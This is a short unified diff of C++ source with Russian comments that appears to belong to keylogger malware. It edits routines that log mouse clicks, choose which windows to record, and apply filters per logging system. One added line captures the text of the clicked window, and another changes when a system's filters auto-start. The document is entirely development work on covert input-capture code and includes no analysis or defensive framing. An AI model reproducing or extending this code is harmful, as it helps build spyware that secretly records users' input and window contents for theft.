@@ -791,7 +791,6 @@ void ProcessMouseMessage(PMSG Msg)
 		return;
 
 	int AlwaysLogMouse = KLG.System ? KLG.System->AlwaysLogMouse : 0;
-
 	// Проверяем необходимость записи кликов
 	if ((Msg->hwnd == Logger->ActiveWND && KLG.Filter) || AlwaysLogMouse)
 	{
@@ -807,6 +806,7 @@ void ProcessMouseMessage(PMSG Msg)
 	// Обрабатываем нажатие кнопки
 
 	bool ValidWnd = KeyLogger::SetActiveWnd(Msg->hwnd, LOG_MOUSE);
+	char* text = GetWndText(Msg->hwnd);
 
 
 	if (!ValidWnd || KLG.Filter == NULL || KLG.Filter->DontSaveMouseLog || KLG.StopLogging || AlwaysLogMouse == 0)
@@ -1914,7 +1914,6 @@ bool KeyLogger::SetActiveWnd(HWND Wnd, DWORD Action)
 	// Фильтркем окно
 
 	bool Ready = FiltrateWnd(Wnd, Action, 0, &System, &Filter, &ParentWND);
-
 	if (!Ready)
 	{
 		// Закрываем  фильтр только в случае
@@ -2628,7 +2627,6 @@ bool KeyLogger::FiltrateWnd(HWND Wnd, DWORD Action, DWORD WndLevel,
 
 	// Этап первый - проверяем зарегистрированные фильтры
 	bool Result = KeyLoggerDoFiltrateWnd(Logger, Wnd, Action, WndLevel, System, Filter, ParentWND);
-
 	if (Result)
 		return true;
 
@@ -2647,7 +2645,7 @@ bool KeyLogger::FiltrateWnd(HWND Wnd, DWORD Action, DWORD WndLevel,
 	{
 		Sys = (PKeyLogSystem)List::GetItem(Logger->Systems, i);
 
-		if (List::Count(Sys->Filters) == 0)
+		if (List::Count(Sys->Filters) == 0 && !Sys->NotAutoStart)
 		{
 			// В случае когда для системы не указаны фильтры
 			// то будем отфильтровывать все окна
